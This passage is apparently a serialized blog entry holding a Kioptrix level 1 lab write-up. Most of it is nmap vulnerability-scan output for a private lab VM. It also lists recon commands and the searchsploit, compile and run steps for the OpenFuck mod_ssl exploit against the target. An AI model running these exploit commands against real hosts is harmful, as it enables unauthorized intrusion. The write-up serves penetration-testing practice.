Group Strength\n|     State: VULNERABLE\n|       Transport Layer Security (TLS) services that use Diffie-Hellman groups\n|       of insufficient strength, especially those using one of a few commonly\n|       shared groups, may be susceptible to passive eavesdropping attacks.\n|     Check results:\n|       WEAK DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: mod_ssl 2.0.x/1024-bit MODP group with safe prime modulus\n|             Modulus Length: 1024\n|             Generator Length: 8\n|             Public Key Length: 1024\n|     References:\n|_      https://weakdh.org\n|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.\n| ssl-ccs-injection: \n|   VULNERABLE:\n|   SSL/TLS MITM vulnerability (CCS Injection)\n|     State: VULNERABLE\n|     Risk factor: High\n|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h\n|       does not properly restrict processing of ChangeCipherSpec messages,\n|       which allows man-in-the-middle attackers to trigger use of a zero\n|       length master key in certain OpenSSL-to-OpenSSL communications, and\n|       consequently hijack sessions or obtain sensitive information, via\n|       a crafted TLS handshake, aka the \&quot;CCS Injection\&quot; vulnerability.\n|           \n|     References:\n|       http://www.openssl.org/news/secadv_20140605.txt\n|       http://www.cvedetails.com/cve/2014-0224\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.\n| ssl-poodle: \n|   VULNERABLE:\n|   SSL POODLE information leak\n|     State: VULNERABLE\n|     IDs:  BID:70574  CVE:CVE-2014-3566\n|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other\n|           products, uses nondeterministic CBC padding, which makes it easier\n|           for man-in-the-middle attackers to obtain cleartext data via a\n|           padding-oracle attack, aka the \&quot;POODLE\&quot; issue.\n|     Disclosure date: 2014-10-14\n|     Check results:\n|       TLS_RSA_WITH_3DES_EDE_CBC_SHA\n|     References:\n|       https://www.openssl.org/~bodo/ssl-poodle.pdf\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566\n|       https://www.imperialviolet.org/2014/10/14/poodle.html\n|_      https://www.securityfocus.com/bid/70574\n|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.\n|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)\n|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)\n|_sslv2-drown: ERROR: Script execution failed (use -d to debug)\n1024/tcp open  status      1 (RPC #100024)\nMAC Address: 00:0C:29:7C:3A:16 (VMware)\n\nHost script results:\n| smb-vuln-cve2009-3103: \n|   VULNERABLE:\n|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2009-3103\n|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,\n|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a\n|           denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE\n|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,\n|           aka \&quot;SMBv2 Negotiation Vulnerability.\&quot;\n|           \n|     Disclosure date: 2009-09-08\n|     References:\n|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]\n|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 356.82 seconds`&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Reproduction/Kioptrix level 1.md&quot;],&quot;assetImports&quot;:[1,[[0,&quot;img/1679306030928.png&quot;],[0,&quot;img/1679366939593.png&quot;],[0,&quot;img/1679366949376.png&quot;],[0,&quot;img/1679366954478.png&quot;],[0,&quot;img/1678960944499.png&quot;],[0,&quot;img/1678960950947.png&quot;]]],&quot;digest&quot;:[0,&quot;f2d5afa6b934df10&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;information-gathering\&quot;&gt;Information gathering&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#information-gathering\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netdiscover -r 192.168.124.0/24&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -Pn -T4 -sV -O 192.168.124.140 -p-&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script vuln 192.168.124.140 -p-&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dirb http://192.168.124.140 /usr/share/wordlists/dirb/big.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;method-1--samba\&quot;&gt;Method-1  Samba&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method-1--samba\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679306030928.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nAttentions please,meterpreter is not availiable\nIt’s root.There is no need to escalate privilege.&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;method-2-openfuck-mod_ssl-vulnerability\&quot;&gt;Method-2 OpenFuck mod_ssl vulnerability&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method-2-openfuck-mod_ssl-vulnerability\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit mod_ssl 2.8.4&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679366939593.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit -p 47080&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679366949376.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679366954478.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nWe need install libssl-dev first.&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;gcc -o OpenFuck 47080.c -lcrypto&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./OpenFuck&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./OpenFuck 0x6b 192.168.124.140 443 -c 40&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;There are some errors in compile process.&lt;/p&gt;\n&lt;h1 id=\&quot;enclosure\&quot;&gt;Enclosure&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#enclosure\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1678960944499.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1678960950947.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n`Nmap scan report for bogon (192.168.124.140)\nHost is up (0.0021s latency).\nNot shown: 65529 closed tcp ports (reset)\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)\n| vulners:\n|   cpe:/a:openbsd:openssh:2.9p2:\n|       CVE-2002-0640   10.0    &lt;a href=\&quot;https://vulners.com/cve/CVE-2002-0640\&quot;&gt;https://vulners.com/cve/CVE-2002-0640&lt;/a&gt;\n|       CVE-2002-0639   10.0    &lt;a href=\&quot;https://vulners.com/cve/CVE-2002-0639\&quot;&gt;https://vulners.com/cve/CVE-2002-0639&lt;/a&gt;\n|       CVE-2002-0083   10.0    &lt;a href=\&quot;https://vulners.com/cve/CVE-2002-0083\&quot;&gt;https://vulners.com/cve/CVE-2002-0083&lt;/a&gt;\n|       CVE-2011-2895   9.3     &lt;a href=\&quot;https://vulners.com/cve/CVE-2011-2895\&quot;&gt;https://vulners.com/cve/CVE-2011-2895&lt;/a&gt;\n|       CVE-2006-5051   9.3     &lt;a href=\&quot;https://vulners.com/cve/CVE-2006-5051\&quot;&gt;https://vulners.com/cve/CVE-2006-5051&lt;/a&gt;\n|       CVE-2006-4924   7.8     &lt;a href=\&quot;https://vulners.com/cve/CVE-2006-4924\&quot;&gt;https://vulners.com/cve/CVE-2006-4924&lt;/a&gt;\n|       CVE-2003-1562   7.6     &lt;a href=\&quot;https://vulners.com/cve/CVE-2003-1562\&quot;&gt;https://vulners.com/cve/CVE-2003-1562&lt;/a&gt;\n|       CVE-2010-4478   7.5     &lt;a href=\&quot;https://vulners.com/cve/CVE-2010-4478\&quot;&gt;https://vulners.com/cve/CVE-2010-4478&lt;/a&gt;\n|       CVE-2002-0575   7.5     &lt;a href=\&quot;https://vulners.com/cve/CVE-2002-0575\&quot;&gt;https://vulners.com/cve/CVE-2002-0575&lt;/a&gt;\n|       CVE-2001-1459   7.5     &lt;a href=\&quot;https://vulners.com/cve/CVE-2001-1459\&quot;&gt;https://vulners.com/cve/CVE-2001-1459&lt;/a&gt;\n|       CVE-2001-1380   7.5     &lt;a href=\&quot;https://vulners.com/cve/CVE-2001-1380\&quot;&gt;https://vulners.com/cve/CVE-2001-1380&lt;/a&gt;\n|       CVE-2001-0816   7.5     &lt;a href=\&quot;https://vulners.com/cve/CVE-2001-0816\&quot;&gt;https://vulners.com/cve/CVE-2001-0816&lt;/a&gt;\n|       SECURITYVULNS:VULN:1956 7.2     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1956\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1956&lt;/a&gt;\n|       CVE-2001-0529   7.2     &lt;a href=\&quot;https://vulners.com/cve/CVE-2001-0529\&quot;&gt;https://vulners.com/cve/CVE-2001-0529&lt;/a&gt;\n|       SSV:64479       5.0     &lt;a href=\&quot;https://vulners.com/seebug/SSV:64479\&quot;&gt;https://vulners.com/seebug/SSV:64479&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       SSV:6192        5.0     &lt;a href=\&quot;https://vulners.com/seebug/SSV:6192\&quot;&gt;https://vulners.com/seebug/SSV:6192&lt;/a&gt;     &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       SSV:60656       5.0     &lt;a href=\&quot;https://vulners.com/seebug/SSV:60656\&quot;&gt;https://vulners.com/seebug/SSV:60656&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       SSV:16847       5.0     &lt;a href=\&quot;https://vulners.com/seebug/SSV:16847\&quot;&gt;https://vulners.com/seebug/SSV:16847&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       PACKETSTORM:73600       5.0     &lt;a href=\&quot;https://vulners.com/packetstorm/PACKETSTORM:73600\&quot;&gt;https://vulners.com/packetstorm/PACKETSTORM:73600&lt;/a&gt;       &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       PACKETSTORM:54435       5.0     &lt;a href=\&quot;https://vulners.com/packetstorm/PACKETSTORM:54435\&quot;&gt;https://vulners.com/packetstorm/PACKETSTORM:54435&lt;/a&gt;       &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       EXPLOITPACK:63CFD85A8DA29BF22328E65C685CBBA3    5.0     &lt;a href=\&quot;https://vulners.com/exploitpack/EXPLOITPACK:63CFD85A8DA29BF22328E65C685CBBA3\&quot;&gt;https://vulners.com/exploitpack/EXPLOITPACK:63CFD85A8DA29BF22328E65C685CBBA3&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       EDB-ID:3303     5.0     &lt;a href=\&quot;https://vulners.com/exploitdb/EDB-ID:3303\&quot;&gt;https://vulners.com/exploitdb/EDB-ID:3303&lt;/a&gt;       &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       CVE-2010-5107   5.0     &lt;a href=\&quot;https://vulners.com/cve/CVE-2010-5107\&quot;&gt;https://vulners.com/cve/CVE-2010-5107&lt;/a&gt;\n|       CVE-2007-2243   5.0     &lt;a href=\&quot;https://vulners.com/cve/CVE-2007-2243\&quot;&gt;https://vulners.com/cve/CVE-2007-2243&lt;/a&gt;\n|       CVE-2006-5052   5.0     &lt;a href=\&quot;https://vulners.com/cve/CVE-2006-5052\&quot;&gt;https://vulners.com/cve/CVE-2006-5052&lt;/a&gt;\n|       SSV:66339       4.9     &lt;a href=\&quot;https://vulners.com/seebug/SSV:66339\&quot;&gt;https://vulners.com/seebug/SSV:66339&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       SSV:10777       4.9     &lt;a href=\&quot;https://vulners.com/seebug/SSV:10777\&quot;&gt;https://vulners.com/seebug/SSV:10777&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3    4.9     &lt;a href=\&quot;https://vulners.com/exploitpack/EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3\&quot;&gt;https://vulners.com/exploitpack/EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       EDB-ID:8163     4.9     &lt;a href=\&quot;https://vulners.com/exploitdb/EDB-ID:8163\&quot;&gt;https://vulners.com/exploitdb/EDB-ID:8163&lt;/a&gt;       &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       CVE-2009-0537   4.9     &lt;a href=\&quot;https://vulners.com/cve/CVE-2009-0537\&quot;&gt;https://vulners.com/cve/CVE-2009-0537&lt;/a&gt;\n|       CVE-2012-0814   3.5     &lt;a href=\&quot;https://vulners.com/cve/CVE-2012-0814\&quot;&gt;https://vulners.com/cve/CVE-2012-0814&lt;/a&gt;\n|       CVE-2011-4327   2.1     &lt;a href=\&quot;https://vulners.com/cve/CVE-2011-4327\&quot;&gt;https://vulners.com/cve/CVE-2011-4327&lt;/a&gt;\n|       CVE-2008-3259   1.2     &lt;a href=\&quot;https://vulners.com/cve/CVE-2008-3259\&quot;&gt;https://vulners.com/cve/CVE-2008-3259&lt;/a&gt;\n|       SECURITYVULNS:VULN:1953 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1953\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1953&lt;/a&gt;\n|       SECURITYVULNS:VULN:1608 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1608\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1608&lt;/a&gt;\n|       SECURITYVULNS:VULN:1499 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1499\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1499&lt;/a&gt;\n|       SECURITYVULNS:VULN:1488 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1488\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1488&lt;/a&gt;\n|       SECURITYVULNS:VULN:1474 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1474\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1474&lt;/a&gt;\n|       SECURITYVULNS:VULN:1439 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1439\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1439&lt;/a&gt;\n|       SECURITYVULNS:VULN:1344 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1344\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1344&lt;/a&gt;\n|       SECURITYVULNS:VULN:1262 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1262\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1262&lt;/a&gt;\n|_      SECURITYVULNS:VULN:1233 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1233\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1233&lt;/a&gt;\n80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)\n| http-enum:\n|   /test.php: Test page\n|   /icons/: Potentially interesting directory w/ listing on ‘apache/1.3.20’\n|   /manual/: Potentially interesting directory w/ listing on ‘apache/1.3.20’\n|_  /usage/: Potentially interesting folder\n|_http-stored-xss: Couldn’t find any stored XSS vulnerabilities.\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-trace: TRACE is enabled\n|&lt;em&gt;http-dombased-xss: Couldn’t find any DOM based XSS.\n|&lt;em&gt;http-csrf: Couldn’t find any CSRF vulnerabilities.\n111/tcp  open  rpcbind     2 (RPC #100000)\n| rpcinfo:\n|   program version    port/proto  service\n|   100000  2            111/tcp   rpcbind\n|   100000  2            111/udp   rpcbind\n|   100024  1           1024/tcp   status\n|&lt;/em&gt;  100024  1           1024/udp   status\n139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)\n443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n| ssl-dh-params:\n|   VULNERABLE:\n|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)\n|     State: VULNERABLE\n|     IDs:  BID:74733  CVE:CVE-2015-4000\n|       The Transport Layer Security (TLS) protocol contains a flaw that is\n|       triggered when handling Diffie-Hellman key exchanges defined with\n|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker\n|       to downgrade the security of a TLS session to 512-bit export-grade\n|       cryptography, which is significantly weaker, allowing the attacker\n|       to more easily break the encryption and monitor or tamper with\n|       the encrypted stream.\n|     Disclosure date: 2015-5-19\n|     Check results:\n|       EXPORT-GRADE DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: mod_ssl 2.0.x/512-bit MODP group with safe prime modulus\n|             Modulus Length: 512\n|             Generator Length: 8\n|             Public Key Length: 512\n|     References:\n|       &lt;a href=\&quot;https://weakdh.org\&quot;&gt;https://weakdh.org&lt;/a&gt;\n|       &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000&lt;/a&gt;\n|       &lt;a href=\&quot;https://www.securityfocus.com/bid/74733\&quot;&gt;https://www.securityfocus.com/bid/74733&lt;/a&gt;\n|&lt;br&gt;\n|   Diffie-Hellman Key Exchange Insufficient Group Strength\n|     State: VULNERABLE\n|       Transport Layer Security (TLS) services that use Diffie-Hellman groups\n|       of insufficient strength, especially those using one of a few commonly\n|       shared groups, may be susceptible to passive eavesdropping attacks.\n|     Check results:\n|       WEAK DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: mod_ssl 2.0.x/1024-bit MODP group with safe prime modulus\n|             Modulus Length: 1024\n|             Generator Length: 8\n|             Public Key Length: 1024\n|     References:\n|&lt;/em&gt;      &lt;a href=\&quot;https://weakdh.org\&quot;&gt;https://weakdh.org&lt;/a&gt;\n|&lt;em&gt;http-dombased-xss: Couldn’t find any DOM based XSS.\n| ssl-ccs-injection:\n|   VULNERABLE:\n|   SSL/TLS MITM vulnerability (CCS Injection)\n|     State: VULNERABLE\n|     Risk factor: High\n|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h\n|       does not properly restrict processing of ChangeCipherSpec messages,\n|       which allows man-in-the-middle attackers to trigger use of a zero\n|       length master key in certain OpenSSL-to-OpenSSL communications, and\n|       consequently hijack sessions or obtain sensitive information, via\n|       a crafted TLS handshake, aka the “CCS Injection” vulnerability.\n|&lt;br&gt;\n|     References:\n|       &lt;a href=\&quot;http://www.openssl.org/news/secadv_20140605.txt\&quot;&gt;http://www.openssl.org/news/secadv_20140605.txt&lt;/a&gt;\n|       &lt;a href=\&quot;http://www.cvedetails.com/cve/2014-0224\&quot;&gt;http://www.cvedetails.com/cve/2014-0224&lt;/a&gt;\n|&lt;/em&gt;      &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224&lt;/a&gt;\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|&lt;em&gt;http-csrf: Couldn’t find any CSRF vulnerabilities.\n| ssl-poodle:\n|   VULNERABLE:\n|   SSL POODLE information leak\n|     State: VULNERABLE\n|     IDs:  BID:70574  CVE:CVE-2014-3566\n|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other\n|           products, uses nondeterministic CBC padding, which makes it easier\n|           for man-in-the-middle attackers to obtain cleartext data via a\n|           padding-oracle attack, aka the “POODLE” issue.\n|     Disclosure date: 2014-10-14\n|     Check results:\n|       TLS_RSA_WITH_3DES_EDE_CBC_SHA\n|     References:\n|       &lt;a href=\&quot;https://www.openssl.org/~bodo/ssl-poodle.pdf\&quot;&gt;https://www.openssl.org/~bodo/ssl-poodle.pdf&lt;/a&gt;\n|       &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566&lt;/a&gt;\n|       &lt;a href=\&quot;https://www.imperialviolet.org/2014/10/14/poodle.html\&quot;&gt;https://www.imperialviolet.org/2014/10/14/poodle.html&lt;/a&gt;\n|&lt;/em&gt;      &lt;a href=\&quot;https://www.securityfocus.com/bid/70574\&quot;&gt;https://www.securityfocus.com/bid/70574&lt;/a&gt;\n|_http-stored-xss: Couldn’t find any stored XSS vulnerabilities.\n|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)\n|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)\n|_sslv2-drown: ERROR: Script execution failed (use -d to debug)\n1024/tcp open  status      1 (RPC #100024)\nMAC Address: 00:0C:29:7C:3A:16 (VMware)&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;Host script results:\n| smb-vuln-cve2009-3103:\n|   VULNERABLE:\n|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2009-3103\n|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,\n|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a\n|           denial of service (system crash) via an &amp;#x26; (ampersand) character in a Process ID High header field in a NEGOTIATE\n|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,\n|           aka “SMBv2 Negotiation Vulnerability.”\n|&lt;br&gt;\n|     Disclosure date: 2009-09-08\n|     References:\n|       &lt;a href=\&quot;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103\&quot;&gt;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103&lt;/a&gt;\n|_      &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103&lt;/a&gt;\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]\n|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]&lt;/p&gt;\n&lt;p&gt;Service detection performed. Please report any incorrect results at &lt;a href=\&quot;https://nmap.org/submit/\&quot;&gt;https://nmap.org/submit/&lt;/a&gt; .\nNmap done: 1 